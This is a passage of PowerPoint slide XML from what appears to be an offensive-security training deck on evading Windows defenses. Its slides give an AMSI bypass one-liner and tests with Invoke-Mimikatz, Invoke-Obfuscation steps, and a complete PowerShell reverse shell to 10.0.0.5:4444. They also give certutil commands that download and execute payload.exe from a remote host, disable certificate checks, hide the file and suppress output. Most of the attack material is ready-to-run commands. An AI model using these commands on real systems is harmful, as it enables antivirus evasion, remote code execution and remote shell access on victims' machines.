      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1362109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0" y="0"/>
            <a:ext cx="12191935" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150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Part 2: Testing AMSI Bypass Effectiveness</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150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1. Test with known malicious string before bypass: Invoke-Expression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amsiutils</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150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2. Test with known malicious string after bypass: Invoke-Expression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amsiutils</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150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3. Execute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Mimikatz</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 detection test: Invoke-</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Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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indent="0">
              <a:lnSpc>
                <a:spcPct val="150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4. Check if command executed without error: echo $?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150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5. Test with AMSI scan buffer directly: $a = [System.Management.Automation.AmsiUtils]::</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amsiContext</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 [System.Management.Automation.AmsiUtils]::AmsiScanBuffer($a,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System.Text.Encoding</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]::UTF8.GetBytes('Invoke-</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Mimikatz</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 0, 0)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150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6. Verify return code: if result is 0 (AMSI_RESULT_CLEAN) bypass worked</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150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7. Test with base64 encoded payload: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System.Convert</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]::FromBase64String('JABhAD0AJwBJA...') |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iex</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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indent="0">
              <a:lnSpc>
                <a:spcPct val="150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8. Check PowerShell console for AMSI errors: $error[0]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150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9. Compare event logs for AMSI detection: Get-</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WinEvent</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FilterHashtable</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 @{LogName='Microsoft-Windows-PowerShell/Operational';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ProviderName</a:t>
            </a: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='PowerShell'; Id=4104} | Select -Last 5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="536918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0" y="139700"/>
            <a:ext cx="11353800" cy="6037263"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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10. Test with obfuscated malicious string: '</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Invo</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ke</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-Mimi'+'</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katz</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 | </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iex</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="20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indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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11. Verify real-time monitoring status: Get-</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MpPreference</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 | Select </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DisableRealtimeMonitoring</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="20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indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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12. Test with script file containing malicious content: echo 'Invoke-</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Mimikatz</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 &gt; test.ps1; ./test.ps1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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13. Restore AMSI and test again to confirm difference: Set-</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MpPreference</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DisableRealtimeMonitoring</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 $false; Invoke-</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Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="20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en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2816467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0" y="0"/>
            <a:ext cx="11887200" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200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Part 3: Obfuscated PowerShell with Invoke-Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200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1. Install Invoke-Obfuscation: Install-Module -Name Invoke-Obfuscation -Scope </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CurrentUser</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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indent="0">
              <a:lnSpc>
                <a:spcPct val="200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2. Import module: Import-Module Invoke-Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200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3. Launch interactive console: Invoke-Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200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4. Set command to obfuscate: SET SCRIPTBLOCK Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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indent="0">
              <a:lnSpc>
                <a:spcPct val="200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5. Obfuscate with string replacement: ENCODING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200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6. Obfuscate with secure string: ENCODING -SECURESTRING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200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7. Obfuscate with command line: ENCODING -COMMAND</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200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8. Obfuscate with base64: ENCODING -BASE64</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200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9. Obfuscate with compression: COMPRESS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200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10. Obfuscate with concatenation: CONCAT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>11. Obfuscate with variable substitution: VARSUB</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37358465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1" y="101600"/>
            <a:ext cx="11972925" cy="6432550"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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12. Obfuscate with reverse string: REVERSE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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13. Launch obfuscated payload from console: LAUNCH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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14. Save obfuscated script to file: OUT -</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FilePath</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 obfuscated.ps1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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15. One-liner obfuscation for AMSI bypass: Invoke-Obfuscation -</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ScriptBlock</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 '[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''</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amsiInitFailed</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NonPublic,Static</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'').SetValue($null,$true)' -Command 'ENCODING -COMMAND' | Out-File bypass.ps1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="20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indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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16. Test obfuscated script execution: ./bypass.ps1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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17. Compare detection logs before and after: Get-</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WinEvent</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FilterHashtable</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 @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} | Select -Last 10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="107000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="20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L="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="160000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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18. Obfuscate reverse shell payload: SET SCRIPTBLOCK '$client = New-Object </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System.Net.Sockets.TCPClient</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("10.0.0.5",4444);$stream = $</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client.GetStream</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();[byte[]]$bytes = 0..65535|%{0};while(($</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i</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 = $</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stream.Read</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($bytes, 0, $</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bytes.Length</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 -ne 0){;$data = (New-Object -TypeName </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System.Text.ASCIIEncoding</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GetString</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($bytes,0, $</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i</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sendback</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 = (</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iex</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 $data 2&gt;&amp;1 | Out-String );$sendback2 = $</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sendback</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 + "PS " + (</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pwd</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).Path + "&gt; ";$</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sendbyte</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 = ([</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text.encoding</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]::ASCII).</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GetBytes</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($sendback2);$</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stream.Write</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($sendbyte,0,$sendbyte.Length);$</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stream.Flush</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>client.Close</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>()' then ENCODING -COMMAND</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42178680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101471" y="0"/>
            <a:ext cx="12420405" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Task 03: LOLBAS (Living Off The Land Binaries and Scripts) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>● Description: Instead of uploading malware, use trusted Windows binaries to perform malicious actions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ● Technical Requirements:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ○ Use Certutil.exe to download a file from a remote server (bypassing browser/firewall alerts). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Use Regsvr32.exe (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Squiblydoo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> attack) to execute a remote script without it ever touching the disk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ○ Explore the LOLBAS Project website and identify 3 more binaries that can be used for execution or persistence.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ● Learning Goal: Discover how to hide "In Plain Sight" by using the operating system's own tools against itself</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23719521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247715" y="114300"/>
            <a:ext cx="11944285" cy="6743700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Part 1 ○ Use Certutil.exe to download a file from a remote server (bypassing browser/firewall alerts). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>1. Download file from remote server: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -f http://10.0.0.5/payload.exe C:\temp\payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>2. Download with alternate user-agent: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -f -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>useragent</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> "Mozilla/5.0" http://10.0.0.5/payload.exe C:\temp\payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>3. Download and execute in one line (execute only if download succeeds): </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -f http://10.0.0.5/payload.exe C:\temp\payload.exe &amp;&amp; C:\temp\payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>4. Download via HTTPS (bypass SSL) - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> cannot bypass SSL; use PowerShell instead: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -command "&amp; { [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>System.Net.ServicePointManager</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>]::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>ServerCertificateValidationCallback</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> = {$true}; (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>DownloadFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>('https://10.0.0.5/payload.exe', 'C:\temp\payload.exe') }"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>5. Download to hidden directory and set hidden attribute: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>attrib</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> +h C:\Windows\Temp\payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>You can use this path as well C:\Users\Default\AppData</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26940736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133415" y="152400"/>
            <a:ext cx="11220385" cy="6024563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>7 Download in background (no output): </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>certutil</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>urlcache</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> -f </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="679EFE"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://10.0.0.5/payload.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> C:\temp\payload.exe &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>nul</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> 2&gt;&amp;1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>8 Verify download completed: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>dir</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> C:\temp\payload.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
